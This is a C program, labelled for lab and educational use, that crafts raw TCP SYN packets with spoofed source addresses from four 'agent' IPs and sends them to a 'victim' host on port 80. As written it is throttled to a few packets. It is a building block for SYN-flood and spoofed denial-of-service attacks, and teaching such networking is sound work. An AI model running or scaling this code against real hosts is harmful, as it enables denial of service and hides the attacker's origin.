/*
  Raw TCP SYN packet generator (LAB / EDUCATIONAL USE)
  Demonstrates spoofed TCP SYN packets using raw sockets
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

/* Checksum function */
unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return answer;
}

int main() {

    int sockfd;
    char packet[4096];

    /* Spoofed agent IPs */
    char *agents[] = {
        "10.0.0.3",
        "10.0.0.4",
        "10.0.0.5",
        "10.0.0.6"
    };

    char victim_ip[] = "10.0.0.2";
    int num_agents = sizeof(agents) / sizeof(agents[0]);

    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in dest;

    dest.sin_family = AF_INET;
    dest.sin_port = htons(80);
    dest.sin_addr.s_addr = inet_addr(victim_ip);

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("Socket");
        return 1;
    }

    int one = 1;
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    printf("Sending TCP SYN packets (controlled)...\n");

    for (int i = 0; i < num_agents; i++) {

        memset(packet, 0, sizeof(packet));

        /* IP HEADER */
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip->id = htons(rand() % 65535);
        ip->frag_off = 0;
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = inet_addr(agents[i]);     // spoofed source
        ip->daddr = dest.sin_addr.s_addr;
        ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));

        /* TCP HEADER */
        tcp->source = htons(4444);
        tcp->dest = htons(80);
        tcp->seq = htonl(1000 + i);
        tcp->ack_seq = 0;
        tcp->doff = 5;

        tcp->syn = 1;   // SYN flag
        tcp->ack = 0;
        tcp->fin = 0;
        tcp->rst = 0;
        tcp->psh = 0;
        tcp->urg = 0;

        tcp->window = htons(65535);
        tcp->check = 0;
        tcp->urg_ptr = 0;

        sendto(sockfd, packet,
               sizeof(struct iphdr) + sizeof(struct tcphdr),
               0,
               (struct sockaddr *)&dest,
               sizeof(dest));

        printf("SYN sent from spoofed IP %s\n", agents[i]);
        usleep(500000);   // slow, controlled sending
    }

    close(sockfd);
    return 0;
}
